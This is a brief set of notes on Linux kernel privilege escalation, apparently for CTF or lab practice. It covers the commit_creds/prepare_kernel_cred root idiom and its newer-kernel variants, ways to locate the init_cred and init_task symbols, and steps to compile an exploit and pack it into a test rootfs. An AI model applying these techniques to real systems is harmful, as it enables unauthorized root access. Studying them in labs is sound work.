commit_creds(prepare_kernel_cred(NULL)) ->  commit_creds(&init_cred) or commit_creds(prepare_kernel_cred(&init_task)) // for new kernel version


nm -n vmlinux | grep init_cred 
/* 
  For showing debug symbols
  but if you don't have vmlinux you should try `cat /proc/kallsyms`
  if still missing, know what? CONFIG_KALLSYMS_ALL -> 0
  *defeating KALLSYMS_ALL => 0? -> DEBUG is the key!*
*/

&init_task //can be found from
  *Symbols (/proc/kallsyms if CONFIG_KALLSYMS_ALL)
  *RBX (at the start of kernel debuging)

/* How to Compile Exploit and test in vm

  $ mkdir root 
  $ cd root; cpio -idv < ../rootfs.cpio 

  gcc main.c -o exp -static -no-pie -fno-stack-protector
  mv exp root
  cd root
  find . -print0 | cpio -o --format=newc --null --owner=root > ../rootfs_updated.cpio
  cd ..

*/
